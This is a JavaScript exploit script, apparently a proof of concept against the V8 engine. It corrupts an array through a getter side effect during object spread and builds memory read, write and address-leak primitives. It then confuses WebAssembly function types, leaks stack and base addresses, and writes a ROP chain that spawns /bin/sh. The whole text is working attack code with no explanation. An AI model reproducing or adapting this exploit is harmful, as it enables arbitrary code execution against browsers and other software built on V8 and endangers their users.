let wasmCode = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 39, 7, 95, 1, 126, 1, 96, 1, 100, 0, 1, 126, 96, 0, 1, 100, 0, 96, 2, 126, 126, 0, 96, 2, 100, 0, 126, 0, 96, 3, 126, 126, 126, 1, 126, 96, 1, 126, 1, 126, 3, 8, 7, 2, 3, 4, 1, 5, 6, 1, 7, 98, 7, 18, 115, 116, 114, 117, 99, 116, 95, 112, 108, 97, 99, 101, 104, 111, 108, 100, 101, 114, 0, 0, 7, 119, 114, 105, 116, 101, 54, 52, 0, 1, 14, 119, 114, 105, 116, 101, 54, 52, 95, 115, 116, 114, 117, 99, 116, 0, 2, 6, 108, 101, 97, 107, 54, 52, 0, 3, 12, 108, 101, 97, 107, 54, 52, 95, 115, 116, 97, 99, 107, 0, 4, 6, 114, 101, 97, 100, 54, 52, 0, 5, 13, 114, 101, 97, 100, 54, 52, 95, 115, 116, 114, 117, 99, 116, 0, 6, 10, 54, 7, 8, 0, 66, 210, 9, 251, 0, 0, 11, 3, 0, 1, 11, 10, 0, 32, 0, 32, 1, 251, 5, 0, 0, 11, 6, 0, 66, 185, 10, 15, 11, 5, 0, 32, 1, 15, 11, 5, 0, 32, 0, 15, 11, 9, 0, 32, 0, 251, 2, 0, 0, 15, 11]);

let wasmModule = new WebAssembly.Module(wasmCode);
let wasmInst = new WebAssembly.Instance(wasmModule);

let wasmWrite64 = wasmInst.exports.write64;
let wasmWrite64Struct = wasmInst.exports.write64_struct;


let wasmRead64 = wasmInst.exports.read64;
let wasmRead64Struct = wasmInst.exports.read64_struct;

let leak64 = wasmInst.exports.leak64;
let leak64Stack = wasmInst.exports.leak64_stack;

//%DebugPrint(wasmWrite64);
//%SystemBreak();

var view = new ArrayBuffer(24);
var dblArr = new Float64Array(view);
var intView = new Uint32Array(view);
var bigIntView = new BigInt64Array(view);


function ftoi32(f) {
    dblArr[0] = f;
    return [intView[0], intView[1]];
}

function i32tof(i1, i2) {
    intView[0] = i1;
    intView[1] = i2;
    return dblArr[0];
}

function itof(i) {
    bigIntView[0] = i;
    return dblArr[0];
}

function ftoi(f) {
    dblArr[0] = f;
    return bigIntView[0];
}


function addrof(obj) {
  oobObjArr[0] = obj;
  var addrDbl = ftoi(corrupted_arr[9]) & 0Xffffffffn;
  return addrDbl;
}

function ar(addr) {
  var old_value = corrupted_arr[oobOffset];
  corrupted_arr[oobOffset] = itof(addr-8n+(2n<<32n));
  var oldAddr = ftoi32(old_value);
  var out = ftoi(oobDblArr[0]);//& 0xffffffffn;
  corrupted_arr[oobOffset] = old_value;
  return out;
}

function aw(addr, val1) {
  var old_value = corrupted_arr[oobOffset];
  corrupted_arr[oobOffset] = itof(addr-8n+(2n<<32n));
  oobDblArr[0] = itof(val1);
  corrupted_arr[oobOffset] = old_value;
  return;
}

var num = 3;
var nameAddr = 0xdc5;
var dblArrMap = 0x0018cb99;//0x25510d;
//var objArrMap = 0x25518d;

var nameAddrF = i32tof(nameAddr, nameAddr);
var fakeDblArray = [1.1,2.2];
var oobDblArr = [2.2];
var oobObjArr = [view];
oobObjArr[0] = {};

var fakeDblArrayAddr = 0x4b12d+12;

var fakeDblArrayEle = fakeDblArrayAddr - 0x18;
fakeDblArray[0] = i32tof(dblArrMap, 0x725);
fakeDblArray[1] = i32tof(fakeDblArrayEle, 0x100);

//%DebugPrint(fakeDblArray);

var x = {};
for (let i = 0; i < num; i++) {
  x['a' + i] = 1;
}
var x1 = {};
for (let i = 0; i < num; i++) {
  x1['a' + i] = 1;
}
x1.prop = 1;
x.__defineGetter__("prop", function() {
  let obj = {};
  obj.a0 = 1.5;
  for (let i = 0; i < 1024 + 512; i++) {
    let tmp = {};
    tmp.a0 = 1;
    for (let j = 1; j < num; j++) {
      tmp['a' + j] = 1;
    }
    tmp['p' + i] = 1;
  }
  return 4;
});
x.z = 1;
delete x.z;
var y = {...x};

var arr = new Array(256);
for (let i = 0; i < 10; i++) {
  arr[i] = new Array(256);
  for (let j = 0; j < arr[i].length; j++) {
    arr[i][j] = nameAddrF;
  }
}


for (let j = 0; j < 10; j++) {
  let a = arr[j];
  for (let i = 0; i < 256; i++) {
    a[i] = //i32tof(nameAddr, fakeDblArrayEle + 0x8);
      i32tof(fakeDblArrayEle + 0x8, nameAddr);
  }
}

var z = {};
z.__proto__ = y;
z.p = 1;
z.p;

oobOffset= 7;

//%DebugPrint(y);
//%DebugPrint(oobObjArr);
//%DebugPrint(oobDblArr);
var corrupted_arr = y.name;
//%DebugPrint(corrupted_arr);

//var v = write(0x1337,0x1337,0x1337);
let placeholder = wasmInst.exports.struct_placeholder();

//%SystemBreak();
for(let i = 0; i < 0x1000; i++){
  wasmWrite64Struct(placeholder, 0n);
  wasmWrite64(0n,0n);
  wasmRead64(0n);
  leak64(placeholder);
  leak64Stack(0n,0n,0n);
}

//%DebugPrint(wasmWrite64);

//Write confusion

let wasm_addr = addrof(wasmWrite64);

console.log(wasm_addr.toString(16));
//%DebugPrint(corrupted_arr);

//%SystemBreak();

let write64SFI = ar(wasm_addr + 0x10n)& 0xffffffffn; //& ~1;

console.log(write64SFI.toString(16));

console.log("Write addr:" +addrof(wasmWrite64Struct).toString(16));

let write64StructSFI = ar(addrof(wasmWrite64Struct) + 0x10n) & 0xffffffffn;// & ~1;

console.log(write64StructSFI.toString(16));

let write64StructTFD =ar(write64StructSFI + 0x4n) & 0xffffffffn;

console.log(write64StructTFD.toString(16));

aw(write64SFI + 0x4n, write64StructTFD);

//%SystemBreak();

//read confusion

console.log(addrof(wasmRead64).toString(16));


let read64SFI = ar(addrof(wasmRead64) + 0x10n)& 0xffffffffn; //& ~1;

console.log(read64SFI.toString(16));

let read64StructSFI = ar(addrof(wasmRead64Struct) + 0x10n) & 0xffffffffn;// & ~1;

console.log(read64StructSFI.toString(16));

let read64StructTFD = ar(read64StructSFI + 0x4n) & 0xffffffffn;

console.log(read64StructTFD.toString(16));

aw(read64SFI + 0x4n, read64StructTFD);


//leak confusion

console.log(addrof(leak64).toString(16));


let leak64SFI = ar(addrof(leak64) + 0x10n) & 0xffffffffn; //& ~1;

console.log(leak64SFI.toString(16));

let leak64StackSFI = ar(addrof(leak64Stack) + 0x10n) & 0xffffffffn;// & ~1;

console.log("SFI:"+read64StructSFI.toString(16));

let leak64StackTFD = ar(leak64StackSFI + 0x4n) & 0xffffffffn;

console.log(leak64StackTFD.toString(16));

aw(leak64SFI + 0x4n, leak64StackTFD);

function write64(addr, val) {
    //References are passed last to WASM function, as such swap the order of arguments to account for this
    //The -7 corrects for the offset from the tagged WasmStruct object pointer to its first field
    wasmWrite64(val, addr - 7n);
}

function read64(addr) {
    //References are passed last to WASM function, as such swap the order of arguments to account for this
    //The -7 corrects for the offset from the tagged WasmStruct object pointer to its first field
    return wasmRead64(addr-0x7n);
}

function leak() {
    //References are passed last to WASM function, as such swap the order of arguments to account for this
    //The -7 corrects for the offset from the tagged WasmStruct object pointer to its first field
    return leak64(placeholder);
}

//%SystemBreak();

var leak_addr = leak();
console.log(leak_addr.toString(16));


let stack_leak = read64(leak_addr+0x328n)
let base_leak = read64(stack_leak+0xb0n)-0x492000n;
//let shellcode = [0x1337n,0x12341234123412n,0x99999999999999n]

add_rsp = base_leak+0x0000000000bec505n;
pop_rdi = base_leak+0x00000000004a24f6n;
pop_rsi = base_leak+0x000000000059426an;
pop_rdx = base_leak+0x00000000004c1e02n;
pop_rax = base_leak+0x00000000004c20b6n;
syscall = base_leak+0x00000000004ad74dn;

console.log(stack_leak.toString(16));
console.log("Base_leak"+base_leak.toString(16));

//%SystemBreak();

let to_rop = stack_leak-0xcb8n
console.log("To_rop addr:" +to_rop.toString(16));

write64(to_rop+0x240n,0x1337n);

var to_stack_value = read64(to_rop+0x240n);
console.log("Value: "+to_stack_value.toString(16));

to_stack_value=to_rop+0x250n;

write64(to_stack_value-0x8n,0x68732f6e69622fn); // /bin/sh
write64(to_stack_value+0x0n,pop_rdi);
write64(to_stack_value+0x8n,to_stack_value-0x8n); // /bin/sh
write64(to_stack_value+0x10n,pop_rsi);
write64(to_stack_value+0x18n,0x0n); // /bin/sh
write64(to_stack_value+0x20n,pop_rdx);
write64(to_stack_value+0x28n,0x0n); // /bin/sh
write64(to_stack_value+0x30n,pop_rax);
write64(to_stack_value+0x38n,0x3bn); // /bin/sh
write64(to_stack_value+0x40n,syscall);

write64(to_rop,add_rsp);

